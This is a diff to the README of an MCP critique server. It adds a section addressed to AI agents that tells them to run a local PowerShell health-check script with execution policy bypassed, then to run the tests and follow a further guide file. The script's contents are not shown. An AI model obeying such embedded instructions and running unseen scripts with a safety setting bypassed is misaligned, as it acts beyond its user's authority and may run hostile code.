@@ -38,6 +38,19 @@ An MCP server that provides critiques of agent work using OpenRouter.
    OPENROUTER_API_KEY=your_key_here
    ```
 
+## 🤖 Agentic Installation (Recommended)
+
+If you are an AI agent installing this server, follow these steps for a flawless setup:
+
+1. **Self-Guided Setup**: Run the included health-check script to verify the environment and generate configuration blocks automatically.
+   ```powershell
+   # On Windows
+   powershell -ExecutionPolicy Bypass -File .\healthcheck_all.ps1
+   ```
+2. **API Verification**: Ensure you have a valid `OPENROUTER_API_KEY`. You can verify the API contract in `api_verification.md`.
+3. **Exhaustive Testing**: Run `npm run test` to perform a non-superficial compliance test of the JSON-RPC redirection logic.
+4. **Detailed Guidance**: Refer to [agent_install.md](agent_install.md) for more structured, multi-step agentic workflows.
+
 ## Integration
 
 Add to your `mcp_config.json`:
